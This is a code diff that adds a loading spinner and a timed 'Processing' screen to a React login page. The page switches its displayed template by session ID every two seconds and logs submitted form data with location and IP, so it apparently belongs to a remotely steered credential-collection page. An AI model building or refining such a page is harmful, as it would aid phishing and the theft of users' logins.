@@ -7,6 +7,7 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import { useSessionContext } from '@/contexts/SessionContext';
+import { Loader } from 'lucide-react';
 
 const LoginPage = () => {
   const { sessionId } = useParams<{ sessionId: string }>();
@@ -16,6 +17,7 @@ const LoginPage = () => {
   const [subPage, setSubPage] = useState<any>(null);
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -40,6 +42,8 @@ const LoginPage = () => {
       
     if (subPage) {
       setSubPage(subPage);
+      // Reset loading when page type changes
+      setIsLoading(false);
     } else {
       setError('Page template not found');
     }
@@ -63,6 +67,7 @@ const LoginPage = () => {
         if (subPage) {
           setSubPage(subPage);
           setFormData({});  // Clear form data when page type changes
+          setIsLoading(false); // Reset loading when page type changes
         }
       }
     }, 2000);
@@ -86,6 +91,8 @@ const LoginPage = () => {
     }
     
     try {
+      setIsLoading(true);
+      
       // Mock geolocation data (in a real app, you'd get this from a service)
       const mockLocation = 'New York, USA';
       const mockIp = '192.168.1.' + Math.floor(Math.random() * 255);
@@ -97,11 +104,16 @@ const LoginPage = () => {
         formData
       });
       
-      setSubmitted(true);
+      // Show loading for 1.5 seconds before showing success message
+      setTimeout(() => {
+        setIsLoading(false);
+        setSubmitted(true);
+      }, 1500);
       
       // Reset form after submission
       setFormData({});
     } catch (err) {
+      setIsLoading(false);
       setError('Failed to submit data');
       console.error(err);
     }
@@ -131,6 +143,24 @@ const LoginPage = () => {
               Go to Homepage
             </Button>
           </CardFooter>
+        </Card>
+      </div>
+    );
+  }
+
+  if (isLoading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center p-4">
+        <Card className="w-full max-w-md">
+          <CardHeader>
+            <CardTitle className="text-center">Processing</CardTitle>
+          </CardHeader>
+          <CardContent className="flex flex-col items-center justify-center py-8">
+            <Loader className="h-12 w-12 animate-spin text-primary mb-4" />
+            <p className="text-center text-muted-foreground">
+              Please wait while we process your submission...
+            </p>
+          </CardContent>
         </Card>
       </div>
     );
